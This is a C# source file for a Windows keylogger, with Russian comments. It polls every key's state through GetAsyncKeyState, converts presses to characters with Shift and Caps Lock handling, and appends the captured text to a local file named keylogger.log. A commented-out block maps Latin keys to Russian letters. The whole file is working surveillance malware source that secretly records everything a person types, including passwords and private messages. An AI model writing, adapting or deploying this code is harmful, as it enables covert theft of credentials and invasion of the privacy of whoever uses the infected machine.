﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace keyloger

{
    static class Program
    {
        const int MaxBufferSixe = 0;// Размер(буфер) записи
        [STAThread]
        static void Main()
        {
            var buf = string.Empty;
            while (true)
            {
                Thread.Sleep(1000);
                for (int i = 0; i < 255; i++)
                {
                    int state = WinApiWrapper.GetAsyncKeyState(i);
                    if (state != (int)KeyState.Unpressed)
                    {



                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += Environment.NewLine; continue; }
                        // Цифровая Клава основная 
                        if (((Keys)i) == Keys.D0) { buf += "0"; continue; }
                        if (((Keys)i) == Keys.D1) { buf += "1"; continue; }
                        if (((Keys)i) == Keys.D2) { buf += "2"; continue; }
                        if (((Keys)i) == Keys.D3) { buf += "3"; continue; }
                        if (((Keys)i) == Keys.D4) { buf += "4"; continue; }
                        if (((Keys)i) == Keys.D5) { buf += "5"; continue; }
                        if (((Keys)i) == Keys.D6) { buf += "6"; continue; }
                        if (((Keys)i) == Keys.D7) { buf += "7"; continue; }
                        if (((Keys)i) == Keys.D8) { buf += "8"; continue; }
                        if (((Keys)i) == Keys.D9) { buf += "9"; continue; }
                        // Цифровая Клава основная 


                        // Цифровая Клава Num
                        if (((Keys)i) == Keys.NumPad0) { buf += "0"; continue; }
                        if (((Keys)i) == Keys.NumPad1) { buf += "1"; continue; }
                        if (((Keys)i) == Keys.NumPad2) { buf += "2"; continue; }
                        if (((Keys)i) == Keys.NumPad3) { buf += "3"; continue; }
                        if (((Keys)i) == Keys.NumPad4) { buf += "4"; continue; }
                        if (((Keys)i) == Keys.NumPad5) { buf += "5"; continue; }
                        if (((Keys)i) == Keys.NumPad6) { buf += "6"; continue; }
                        if (((Keys)i) == Keys.NumPad7) { buf += "7"; continue; }
                        if (((Keys)i) == Keys.NumPad8) { buf += "8"; continue; }
                        if (((Keys)i) == Keys.NumPad9) { buf += "9"; continue; }
                        // Цифровая Клава Num



                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;


                        //SHIFT|CAPS Тут мы приводим буквы к верхнему регистру если SHIFT или CAPS активны
                        if (((Keys)i).ToString().Length == 1)// Если клавиша SHIFT|CAPS зажата(true) приводим их к верхнему регистру(делаем с большой буквы)
                        {
                            buf += IsBigSymbol() ? ((Keys)i).ToString().ToUpper() : ((Keys)i).ToString().ToLower();// Приводим к нижнему или верхнему регистру
                        }
                        //SHIFT|CAPS Тут мы приводим буквы к верхнему регистру если SHIFT или CAPS активны

                        /*//Перевод в русские буквы
                        if (((Keys)i) == Keys.A) { buf += "_(ф)_"; continue; }
                        if (((Keys)i) == Keys.B) { buf += "_(и)_"; continue; }
                        if (((Keys)i) == Keys.C) { buf += "_(с)_"; continue; }
                        if (((Keys)i) == Keys.D) { buf += "_(в)_"; continue; }
                        if (((Keys)i) == Keys.E) { buf += "_(у)_"; continue; }
                        if (((Keys)i) == Keys.F) { buf += "_(а)_"; continue; }
                        if (((Keys)i) == Keys.G) { buf += "_(п)_"; continue; }
                        if (((Keys)i) == Keys.H) { buf += "_(Р)_"; continue; }
                        if (((Keys)i) == Keys.I) { buf += "_(ш)_"; continue; }
                        if (((Keys)i) == Keys.J) { buf += "_(о)_"; continue; }
                        if (((Keys)i) == Keys.K) { buf += "_(л)_"; continue; }
                        if (((Keys)i) == Keys.L) { buf += "_(д)_"; continue; }
                        if (((Keys)i) == Keys.M) { buf += "_(ь)_"; continue; }
                        if (((Keys)i) == Keys.N) { buf += "_(т)_"; continue; }
                        if (((Keys)i) == Keys.O) { buf += "_(щ)_"; continue; }
                        if (((Keys)i) == Keys.P) { buf += "_(з)_"; continue; }
                        if (((Keys)i) == Keys.Q) { buf += "_(й)_"; continue; }
                        if (((Keys)i) == Keys.R) { buf += "_(к)_"; continue; }
                        if (((Keys)i) == Keys.S) { buf += "_(ы)_"; continue; }
                        if (((Keys)i) == Keys.T) { buf += "_(е)_"; continue; }
                        if (((Keys)i) == Keys.U) { buf += "_(г)_"; continue; }
                        if (((Keys)i) == Keys.V) { buf += "_(м)_"; continue; }
                        if (((Keys)i) == Keys.W) { buf += "_(ц)_"; continue; }
                        if (((Keys)i) == Keys.X) { buf += "_(ч)_"; continue; }
                        if (((Keys)i) == Keys.Y) { buf += "_(н)_"; continue; }
                        if (((Keys)i) == Keys.Z) { buf += "_(я)_"; continue; }
                        //Перевод в русские буквы
                        */



                        // Делаем запись кнопок в текстовый файл
                        if (buf.Length > MaxBufferSixe)// Если буфер больше 10 символов, то делаем запись в файл 
                        {
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                          
                        }
                        //Делаем запись кнопок в текстовый файл
                    }
                }
            }
            
        }
    

        static bool IsBigSymbol()
        {
            bool shift = false;// Временная переменная SHIFT
            var shiftNumber = 16;// SHIFT обозначает цифра 16
            short shiftState = (short)WinApiWrapper.GetAsyncKeyState(shiftNumber);// тут мы проверяем состояние SHIFT
            // Keys.ShiftKey не работает, поэтому я подставил его числовой эквивалент
            // GetAsyncKeyState состояние клавиш через WINAPI
            if ((shiftState & 0x8000) == 0x8000)
            {
                shift = true;
            }

            var caps = Console.CapsLock;
            bool isBig = shift | caps;// если хоть одно  из условий true то буква большая 

            return isBig;
        }
    }

    public enum KeyState : int// Состояние кнопки
    {
        Unpressed = 0
    }
}
public enum Keys1
{



    Keyо = 0x4F,




}

